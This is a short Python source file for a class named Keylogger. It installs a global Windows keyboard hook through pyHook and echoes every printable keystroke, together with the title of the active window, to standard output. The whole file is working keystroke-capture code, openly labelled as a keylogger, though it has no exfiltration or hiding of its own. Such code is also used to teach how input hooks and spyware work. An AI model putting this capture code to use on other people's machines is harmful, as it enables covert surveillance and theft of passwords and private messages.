import pyHook
import pygame # or import pythoncom
import sys
class Keylogger():
    def __init__(self):
        self.windowname = None
        self.hm = pyHook.HookManager()
        self.hm.KeyDown = self.OnKeyboardEvent
        self.hm.HookKeyboard()
        
    def run(self):
        # initialize pygame and start the game loop
        pygame.init()
        while True:
            pygame.event.pump()
        #or pythoncom.PumpMessages()
            
    def OnKeyboardEvent(self, event):
        
        if event.WindowName != self.windowname:
            self.windowname = event.WindowName
            print ("\n\nWindow: [%s]" % self.windowname)
        if (event.Ascii > 31 and event.Ascii < 127) or event.Ascii == 13 or event.Ascii == 9:
            sys.stdout.write(chr(event.Ascii))
        '''
        print 'MessageName:',event.MessageName
        print 'Message:',event.Message
        print 'Time:',event.Time
        print 'Window:',event.Window
        print 'WindowName:',event.WindowName
        print 'Ascii:', event.Ascii, chr(event.Ascii)
        print 'Key:', event.Key
        print 'KeyID:', event.KeyID
        print 'ScanCode:', event.ScanCode
        print 'Extended:', event.Extended
        print 'Injected:', event.Injected
        print 'Alt', event.Alt
        print 'Transition', event.Transition
        print '---'
        '''      

if __name__ == "__main__":
    k = Keylogger()
    k.run()